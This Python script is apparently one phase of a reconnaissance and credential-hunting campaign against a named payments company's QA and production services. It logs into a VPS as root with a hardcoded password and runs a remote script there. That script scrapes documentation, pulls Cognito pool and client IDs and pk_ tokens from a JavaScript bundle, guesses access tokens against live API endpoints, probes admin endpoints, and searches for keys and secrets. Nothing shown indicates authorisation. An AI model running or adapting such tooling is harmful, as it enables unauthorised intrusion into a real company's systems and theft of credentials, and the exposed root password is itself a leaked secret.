"""Phase 7: Download ALL doc pages + extract QA Cognito + test pk_ tokens."""
import paramiko, textwrap, json

VPS = "216.238.75.117"
PW = r"]Aq9mngH(_%ZV%jn"

REMOTE = textwrap.dedent(r'''
import json, urllib.request, urllib.error, ssl, time, re, html as htmlmod

ctx = ssl._create_unverified_context()

def req(url, data=None, headers=None, method=None, timeout=30):
    hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"}
    if headers:
        hdrs.update(headers)
    if isinstance(data, dict):
        data = json.dumps(data).encode()
    elif isinstance(data, str):
        data = data.encode()
    r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
        body = resp.read()
        return resp.status, body, dict(resp.headers)
    except urllib.error.HTTPError as e:
        body = e.read()
        return e.code, body, dict(e.headers)
    except Exception as e:
        return 0, str(e).encode(), {}

QA = "https://landing.qa.disperso.com"

# ======================================================
print("=" * 60)
print("1. DOWNLOAD ALL DOC PAGES")
print("=" * 60)

doc_pages = [
    "/docs/en/autenticacion/index.html",
    "/docs/en/flujo-integracion/index.html",
    "/docs/en/introduccion/index.html",
    "/docs/en/paises/chile/index.html",
    "/docs/en/paises/mexico/index.html",
    "/docs/en/paises/peru/index.html",
    "/docs/en/changelog/index.html",
    "/docs/en/api/index.html",
]

all_docs = {}
for page in doc_pages:
    s, b, h = req(f"{QA}{page}")
    if s == 200 and len(b) > 100:
        content = b.decode(errors="replace")
        text = re.sub(r'<script[^>]*>.*?</script>', '', content, flags=re.DOTALL)
        text = re.sub(r'<style[^>]*>.*?</style>', '', text, flags=re.DOTALL)
        text = re.sub(r'<[^>]+>', ' ', text)
        text = htmlmod.unescape(text)
        text = re.sub(r'\s+', ' ', text).strip()
        
        name = page.split("/")[-2] if page.endswith("/index.html") else page.split("/")[-1]
        all_docs[name] = text
        print(f"\n{'='*40}")
        print(f"PAGE: {name} ({len(b):,}b raw, {len(text):,} chars text)")
        print(f"{'='*40}")
        print(text[:3000])
        if len(text) > 3000:
            print(f"\n... [{len(text)-3000} more chars] ...")
    else:
        print(f"  {page} -> {s} ({len(b)}b)")
    time.sleep(0.5)

# ======================================================
print("\n\n" + "=" * 60)
print("2. EXTRACT QA COGNITO CONFIG FROM JS BUNDLE")
print("=" * 60)

s, b, h = req("https://frontend.qa.disperso.com/js/index.d28fb291.js")
if s == 200:
    js = b.decode(errors="replace")
    print(f"  Bundle: {len(js):,} chars")
    
    # Extract Cognito User Pool ID
    pools = re.findall(r'us-east-2_[A-Za-z0-9]+', js)
    print(f"\n  User Pool IDs: {list(set(pools))}")
    
    # Extract Client IDs (26-char alphanumeric)
    # Look specifically near Cognito context
    cognito_ctx = []
    for m in re.finditer(r'(?:UserPool|ClientId|client_id|cognito|Pool|poolData)', js):
        start = max(0, m.start()-200)
        end = min(len(js), m.end()+200)
        cognito_ctx.append(js[start:end])
    
    print(f"\n  Cognito contexts ({len(cognito_ctx)} found):")
    seen = set()
    for ctx_str in cognito_ctx:
        if ctx_str not in seen:
            seen.add(ctx_str)
            # Extract IDs from this context
            ids = re.findall(r'["\']([a-z0-9]{20,30})["\']', ctx_str)
            if ids:
                print(f"    ClientIDs near cognito: {ids}")
            print(f"    ...{ctx_str[:200]}...")
    
    # Extract ALL pk_ tokens or patterns
    pk_patterns = re.findall(r'pk_(?:live|sandbox|test|dev)_[A-Za-z0-9_]+', js)
    print(f"\n  pk_ tokens: {list(set(pk_patterns))}")
    
    # Extract X-Disperso-Access-Token context
    token_ctx = re.findall(r'.{0,100}X-Disperso-Access-Token.{0,100}', js)
    for tc in token_ctx:
        print(f"\n  Token header context: {tc.strip()[:200]}")
    
    # Extract PATH_FRONTEND_COGNITO
    cogn_path = re.findall(r'.{0,100}FRONTEND_COGNITO.{0,100}', js)
    for cp in cogn_path:
        print(f"\n  FRONTEND_COGNITO: {cp.strip()[:200]}")
    
    # Extract token storage
    token_storage = re.findall(r'.{0,80}TOKEN_EXPEI.{0,80}', js)
    for ts in token_storage:
        print(f"\n  TOKEN_EXPEI: {ts.strip()[:200]}")
    
    # Extract access token flow
    access_flow = re.findall(r'.{0,100}access-token.{0,100}', js, re.IGNORECASE)
    for af in access_flow[:5]:
        print(f"\n  access-token flow: {af.strip()[:200]}")
    
    # Save full extracted config
    with open("/tmp/qa_cognito_config.txt", "w") as f:
        f.write(f"User Pools: {pools}\n")
        f.write(f"pk_ patterns: {pk_patterns}\n")
        for tc in token_ctx:
            f.write(f"Token ctx: {tc}\n")
        for cp in cogn_path:
            f.write(f"Cognito path: {cp}\n")

# ======================================================
print("\n\n" + "=" * 60)
print("3. TEST pk_ TOKENS ON QA API")
print("=" * 60)

QA_API = "https://clxkb4ym40.execute-api.us-east-2.amazonaws.com/qa"
PROD_API = "https://rdrrxexkm4.execute-api.us-east-2.amazonaws.com/prod"

# Try common test tokens
test_tokens = [
    "pk_sandbox_test",
    "pk_sandbox_demo",
    "pk_sandbox_disperso",
    "pk_sandbox_tuxpan",
    "pk_sandbox_admin",
    "pk_test_12345",
    "pk_sandbox_12345",
    "pk_dev_12345",
]

for token in test_tokens:
    for base, env in [(QA_API, "QA"), (PROD_API, "PROD")]:
        s, b, h = req(f"{base}/api/v1/bank",
                      headers={"X-Disperso-Access-Token": token})
        if s != 403:
            print(f"  {env} token={token}: {s} ({len(b)}b) {b[:150].decode(errors='replace')}")
        time.sleep(0.2)

# ======================================================
print("\n\n" + "=" * 60)
print("4. QA ADMIN COGNITO ENDPOINT")
print("=" * 60)

# The PATH_FRONTEND_COGNITO resolves to /api/v1/client-account/frontend-cognito
for base, env in [(QA_API, "QA"), (PROD_API, "PROD")]:
    for path in [
        "/api/v1/client-account/frontend-cognito",
        "/api/v1/client-account/access-token/list-actions",
        "/api/v1/client-account/document",
        "/api/v1/client-account/frontend-cognito?countryCode=CL",
        "/api/v1/client-account/frontend-cognito?countryCode=MX",
    ]:
        s, b, h = req(f"{base}{path}")
        tag = "!!!" if s == 200 else ""
        if s != 403:
            print(f"  {tag} {env} {path} -> {s} ({len(b)}b) {b[:150].decode(errors='replace')}")
        time.sleep(0.3)

# ======================================================
print("\n\n" + "=" * 60)
print("5. SEARCH DOCS FOR PEM/KEY/CERT/SECRET")
print("=" * 60)

for name, text in all_docs.items():
    for kw in ["pem", "key", "cert", "private", "public key", "RSA", "secret",
               "pk_live", "pk_sandbox", "pk_test", "token", "XXXXXX",
               "Bearer", "X-Disperso", "api-key", "clabe", "SPEI",
               "webhook", "callback", "hmac", "signature"]:
        matches = re.findall(rf'.{{0,80}}{re.escape(kw)}.{{0,80}}', text, re.IGNORECASE)
        if matches:
            print(f"\n  [{name}] '{kw}':")
            for m in matches[:3]:
                print(f"    {m.strip()[:150]}")

print("\n" + "=" * 60)
print("PHASE 7 DONE")
print("=" * 60)
''')

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(VPS, username="root", password=PW, timeout=15)
sftp = ssh.open_sftp()
with sftp.file("/tmp/todo7.py", "w") as f:
    f.write(REMOTE)
sftp.close()
print(f"Connected {VPS}, running phase 7...")
stdin, stdout, stderr = ssh.exec_command("python3 /tmp/todo7.py 2>&1", timeout=300)
out = stdout.read().decode(errors="replace")
with open(r"c:\xampp\htdocs\pentagi\disperso_recon\phase7_full.txt", "w", encoding="utf-8", errors="replace") as f:
    f.write(out)
print(f"Output ({len(out)} chars) saved to disperso_recon/phase7_full.txt")
ssh.close()
